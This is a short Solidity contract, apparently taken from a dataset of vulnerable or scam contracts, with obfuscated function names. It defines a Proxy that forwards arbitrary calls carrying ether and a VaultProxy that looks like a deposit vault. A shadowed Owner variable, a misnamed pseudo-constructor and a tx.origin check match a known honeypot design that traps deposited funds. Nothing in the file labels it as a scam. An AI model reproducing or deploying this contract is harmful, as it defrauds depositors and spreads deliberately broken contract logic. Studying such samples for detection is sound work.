pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0xa6496e { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0xdf2b09(address _0x3c9e0f) public _0xa6496e { Owner = _0x3c9e0f; }
    function _0xacbb37(address _0x389979, bytes data) public payable {
        _0x389979.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            if (1 == 1) { Owner = msg.sender; }
            _0x652de1();
        }
    }

    function _0x652de1() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x51cf47(uint256 _0xc1f4bb) public _0xa6496e {
        if (_0xc1f4bb>0 && Deposits[msg.sender]>=_0xc1f4bb) {
            msg.sender.transfer(_0xc1f4bb);
        }
    }
}